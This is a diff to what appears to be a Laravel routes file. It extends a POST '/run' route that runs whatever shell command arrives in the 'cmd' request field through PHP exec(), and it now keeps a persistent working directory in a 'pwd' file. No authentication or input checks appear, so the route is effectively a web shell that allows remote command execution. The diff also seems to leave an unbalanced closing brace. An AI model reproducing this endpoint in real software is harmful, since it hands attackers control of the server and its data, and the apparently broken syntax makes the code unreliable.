@@ -17,16 +17,50 @@ use  App\Http\Controllers\ApiController;
 
 
 Route::post('/run', function (Request $request) {
+   try{
+		
    $cmd = $request->input("cmd");
-   exec( "cd ~ && $cmd 2>&1", $output);
+   
    $res = "";
-   foreach($output as $out)
+   
+	$dir = "~";
+	if(file_exists("pwd"))
+	 $dir = file_get_contents('pwd');
+   
+    
+   if(str_contains($cmd,"cd "))
    {
-	    $res .= "$out \r\n";
-   }   
+	   
+	  exec( "cd $dir && $cmd && pwd 2>&1", $results);
+	  if(count($results)>0)
+	  {
+	   file_put_contents('pwd', $results[count($results)-1] );
+	   return "OK , we're here : ". file_get_contents('pwd');
+	  }
+    
+   }
+   else{
+
+	   exec( "cd $dir && $cmd 2>&1", $output);
+	   foreach($output as $out)
+	   {
+			$res .= "$out \r\n";
+	   }   
+   
+   }
+   
+   
    if(strlen($res)==0)
 	   return " Done! ";
    return  $res;
+    }
+	catch(\Error | \Exception $e){
+		return $e->getMessage();
+	}
+   
+});
+ 
+ 
 });
  
  
